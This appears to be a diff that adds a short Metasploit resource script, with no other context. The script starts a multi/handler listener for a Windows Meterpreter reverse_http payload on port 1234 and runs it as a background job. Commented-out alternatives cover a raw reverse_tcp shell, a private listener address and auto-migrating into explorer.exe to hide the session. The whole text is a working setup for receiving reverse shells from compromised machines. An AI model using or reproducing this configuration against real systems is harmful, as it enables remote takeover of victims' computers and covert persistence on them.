@@ -1,0 +1,8 @@
+use exploit/multi/handler 
+# set payload windows/x64/shell/reverse_tcp
+# set lhost 192.168.183.131
+set payload windows/meterpreter/reverse_http
+set lhost 0.0.0.0
+set lport 1234
+# set autorunscript migrate -n explorer.exe
+run -j
